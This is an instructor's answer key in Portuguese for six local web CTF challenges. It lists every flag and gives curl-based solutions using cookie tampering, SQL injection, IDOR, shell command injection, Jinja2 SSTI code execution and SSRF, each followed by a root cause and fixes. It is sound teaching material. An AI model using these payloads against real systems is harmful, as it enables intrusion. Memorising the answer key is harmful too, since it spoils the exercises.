# Gabarito — 6 CTFs Web

> Material do instrutor. Não distribua para os alunos.

## Resumo das flags

| # | Desafio | Nível | Flag |
|---|---------|-------|------|
| 01 | Cookie Monsters | fácil | `flag{c00k13s_s4o_cr0c4nt3s}` |
| 02 | SQLi Login | fácil | `flag{sq1_1nj3ct10n_b4s1c4}` |
| 03 | NotasWeb | fácil | `flag{1d0r_n0t4s_d0_adm1n}` |
| 04 | NetCheck | fácil | `flag{c0mm4nd_1nj3ct10n_b4s1c4}` |
| 05 | TemplateLab | médio | `flag{sst1_j1nj4_rce}` |
| 06 | URL Preview | médio | `flag{ssrf_r3d3_1nt3rn4}` |

## CTF 01 — Cookie Monsters

**Flag:** `flag{c00k13s_s4o_cr0c4nt3s}`

### Passo a passo

1. Acesse http://localhost:8001 e faça login com `guest` / `guest`.
2. No painel, o cookie `session` aparece na seção de depuração ou no DevTools.
3. O valor inicial é:

   ```text
   eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9
   ```

4. Decodificando:

   ```bash
   echo 'eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9' | base64 -d
   ```

   Resultado:

   ```json
   {"user":"guest","role":"user"}
   ```

5. Altere `role` para `admin` e codifique novamente:

   ```bash
   printf '%s' '{"user":"guest","role":"admin"}' | base64 -w0
   ```

   Resultado:

   ```text
   eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==
   ```

6. Substitua o cookie no navegador ou use `curl`:

   ```bash
   curl -s \
     -b 'session=eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ==' \
     http://localhost:8001/dashboard | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{c00k13s_s4o_cr0c4nt3s}
   ```

### Causa raiz

O servidor usa o cookie apenas como `base64(JSON)` e confia no campo `role` enviado pelo cliente. Base64 não é assinatura nem criptografia: qualquer pessoa pode ler e alterar o conteúdo.

### Correção

- Assinar e/ou criptografar o cookie (por exemplo, usando a sessão do Flask, que assina os dados com `itsdangerous`).
- Não armazenar o papel (`role`) no cliente. Guardar apenas um identificador de sessão e consultar o papel no servidor.
- Invalidar a sessão no servidor ao fazer logout e definir `HttpOnly`, `Secure` e `SameSite`.

---

## CTF 02 — SQLi Login

**Flag:** `flag{sq1_1nj3ct10n_b4s1c4}`

### Passo a passo

A conta `guest` / `guest` é válida, mas não é administradora. A senha do `admin` é aleatória, então o caminho é a SQL Injection.

1. Payload no campo **usuário**:

   ```text
   admin' --
   ```

   Senha: qualquer valor.

2. Enviando via `curl`, guardando o cookie de sessão:

   ```bash
   curl -s -i \
     -X POST http://localhost:8002/login \
     --data-urlencode "username=admin' --" \
     --data-urlencode "password=qualquer" \
     -c /tmp/ctf02.cookies
   ```

3. Acessando o painel:

   ```bash
   curl -s \
     -b /tmp/ctf02.cookies \
     http://localhost:8002/admin | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{sq1_1nj3ct10n_b4s1c4}
   ```

4. Alternativa com condição sempre verdadeira:

   ```text
   ' OR 1=1 --
   ```

   A consulta retorna o primeiro usuário da tabela, que é o `admin`.

### Por que funciona

A aplicação monta a consulta por concatenação:

```sql
SELECT id, username, is_admin FROM users
WHERE username = '<usuário>' AND password = '<senha>';
```

Com `admin' --`, a consulta vira:

```sql
SELECT id, username, is_admin FROM users
WHERE username = 'admin' --' AND password = 'qualquer';
```

O `--` transforma o restante da linha em comentário, removendo a verificação de senha. Com `' OR 1=1 --`, a condição `WHERE` fica sempre verdadeira e a consulta retorna o primeiro registro, o `admin`.

O painel `/admin` só é liberado porque a aplicação usa o `username` do registro retornado para montar a sessão. Como o registro do `admin` foi retornado, a sessão recebe `user=admin`.

### Causa raiz

Entrada do usuário concatenada diretamente na consulta SQL, permitindo alterar a estrutura da consulta. Somam-se a isso a exibição de mensagens de erro do banco e a existência de um usuário administrador na mesma tabela de login.

### Correção

- Usar **prepared statements / queries parametrizadas**:

  ```python
  db.execute(
      "SELECT id, username, is_admin FROM users WHERE username = ? AND password = ?",
      (username, password),
  )
  ```

- Nunca montar SQL com `f-string`, `%`, `.format()` ou concatenação.
- Armazenar senhas com hash forte (Argon2id, bcrypt ou scrypt), nunca em texto puro.
- Não exibir detalhes de erros do banco para o usuário final.
- Aplicar menor privilégio no usuário do banco e validar/autorizar o acesso ao painel no servidor.
- Adicionar rate limiting e monitoramento de tentativas de login.

---

## CTF 03 — NotasWeb

**Flag:** `flag{1d0r_n0t4s_d0_adm1n}`

### Passo a passo

1. Acesse http://localhost:8003 e faça login com `guest` / `guest`.
2. A lista mostra a nota `#1`, acessível em `/notes/1`.
3. O ID está na URL. Altere para `/notes/2`:

   ```text
   http://localhost:8003/notes/2
   ```

4. A aplicação retorna a nota privada do administrador, incluindo a flag.

Via `curl`:

```bash
rm -f /tmp/ctf03.cookies

curl -s -X POST http://localhost:8003/login \
  --data 'username=guest&password=guest' \
  -c /tmp/ctf03.cookies

curl -s -b /tmp/ctf03.cookies \
  http://localhost:8003/notes/2 | grep -o 'flag{[^}]*}'
```

Saída:

```text
flag{1d0r_n0t4s_d0_adm1n}
```

### Causa raiz

O endpoint `/notes/<id>` verifica se o usuário está autenticado, mas não verifica se a nota pertence a ele. O ID é previsível e vem diretamente da URL, permitindo acesso horizontal a objetos de outro usuário (IDOR).

### Correção

- Validar a autorização em cada acesso: buscar a nota com `WHERE id = ? AND owner = ?` usando o usuário da sessão.
- Negar por padrão quando o recurso não pertence ao usuário.
- Usar identificadores não sequenciais (UUID) como defesa em profundidade, sem substituir a checagem de autorização.
- Adicionar testes automatizados de IDOR para os endpoints que recebem IDs.

---

## CTF 04 — NetCheck

**Flag:** `flag{c0mm4nd_1nj3ct10n_b4s1c4}`

### Passo a passo

1. Acesse http://localhost:8004.
2. Teste o encadeamento de comandos no campo de host:

   ```text
   localhost; id
   ```

   A saída mostra o resultado do `getent` e do `id`, confirmando a execução de comandos.

3. Leia a flag:

   ```text
   localhost; cat /tmp/flag.txt
   ```

4. Via `curl`:

   ```bash
   curl -s -X POST http://localhost:8004/ \
     --data-urlencode 'host=localhost; cat /tmp/flag.txt' \
     | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{c0mm4nd_1nj3ct10n_b4s1c4}
   ```

### Por que funciona

O servidor monta o comando por concatenação e o executa com `shell=True`:

```python
command = f"getent hosts {host}"
subprocess.run(command, shell=True, ...)
```

Com `localhost; cat /tmp/flag.txt`, o shell executa dois comandos separados pelo `;`:

```text
getent hosts localhost
cat /tmp/flag.txt
```

### Causa raiz

Entrada do usuário concatenada em um comando interpretado por um shell, permitindo injetar metacaracteres (`;`, `&&`, `|`, `$()`, backticks etc.).

### Correção

- Não usar `shell=True`. Passar os argumentos como lista:

  ```python
  subprocess.run(["getent", "hosts", host], shell=False, ...)
  ```

- Validar a entrada com allowlist (por exemplo, aceitar apenas hostnames/IPs válidos).
- Executar comandos com o menor privilégio possível e sem segredos acessíveis no mesmo container.
- Aplicar defesa em profundidade: seccomp/AppArmor, filesystem somente leitura e isolamento de rede.

---

## CTF 05 — TemplateLab

**Flag:** `flag{sst1_j1nj4_rce}`

### Passo a passo

1. Acesse http://localhost:8005.
2. Teste a avaliação de expressões no campo de nome:

   ```text
   {{ 7 * 7 }}
   ```

   A pré-visualização mostra `49`, confirmando a SSTI.

3. Leia a flag usando o módulo `os` a partir dos globals do Jinja2:

   ```text
   {{ cycler.__init__.__globals__.os.popen('cat /tmp/flag.txt').read() }}
   ```

4. Via `curl`:

   ```bash
   curl -s -X POST http://localhost:8005/ \
     --data-urlencode "name={{ cycler.__init__.__globals__.os.popen('cat /tmp/flag.txt').read() }}" \
     | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{sst1_j1nj4_rce}
   ```

### Por que funciona

A aplicação concatena a entrada do usuário ao código-fonte do template e o renderiza:

```python
preview = render_template_string("Olá, " + name + "! ...")
```

O Jinja2 avalia `{{ ... }}` antes de gerar a saída. A partir de objetos globais disponíveis no ambiente (`cycler`, `lipsum`, `joiner` etc.), é possível chegar ao módulo `os` e executar comandos no servidor.

### Causa raiz

Entrada do usuário interpretada como template Jinja2, sem sandbox. Isso permite execução de código no servidor e leitura de arquivos e variáveis de ambiente.

### Correção

- Nunca renderizar entrada do usuário como template. Passar o valor como variável em um template fixo:

  ```python
  return render_template("index.html", name=name)
  ```

- Se templates precisarem ser editáveis por usuários, usar um sandbox e uma allowlist restrita de variáveis e filtros.
- Evitar expor objetos internos do Python no ambiente de templates.
- Aplicar menor privilégio no processo e isolar segredos do container da aplicação.

---

## CTF 06 — URL Preview

**Flag:** `flag{ssrf_r3d3_1nt3rn4}`

### Passo a passo

O serviço `ctf06-flag-service` não tem porta publicada no host. Ele só pode ser alcançado pela rede Docker:

```text
http://flag-service:8000/flag
```

1. Acesse http://localhost:8006.
2. Informe a URL interna no formulário:

   ```text
   http://flag-service:8000/flag
   ```

3. O servidor faz a requisição, recebe a flag e exibe o corpo da resposta.

4. Via `curl`:

   ```bash
   curl -s -X POST http://localhost:8006/ \
     --data-urlencode 'url=http://flag-service:8000/flag' \
     | grep -o 'flag{[^}]*}'
   ```

   Saída:

   ```text
   flag{ssrf_r3d3_1nt3rn4}
   ```

5. O bloqueio de `localhost` e `127.0.0.1` não impede o acesso ao hostname interno `flag-service`.

### Por que funciona

A aplicação busca qualquer URL `http://` ou `https://` a partir do servidor. Como o backend está na mesma rede Docker que o serviço interno, ele consegue resolver `flag-service` e acessar a porta 8000. O navegador do aluno não tem acesso direto a esse serviço, mas o servidor tem.

### Causa raiz

SSRF: a aplicação permite que o usuário controle o destino de uma requisição feita pelo servidor. A validação por blocklist de strings é insuficiente e não há restrição de egresso para a rede interna.

### Correção

- Usar allowlist de domínios e esquemas permitidos.
- Resolver o DNS e bloquear faixas privadas, loopback e link-local após a resolução, não apenas por string.
- Revalidar o destino após cada redirecionamento ou desabilitar redirecionamentos.
- Aplicar políticas de egresso na rede (firewall/NetworkPolicy) para impedir que a aplicação alcance serviços internos desnecessários.
- Não manter segredos em serviços acessíveis pela mesma rede sem autenticação.
- Preferir um proxy de saída dedicado, com allowlist e sem acesso à rede interna.
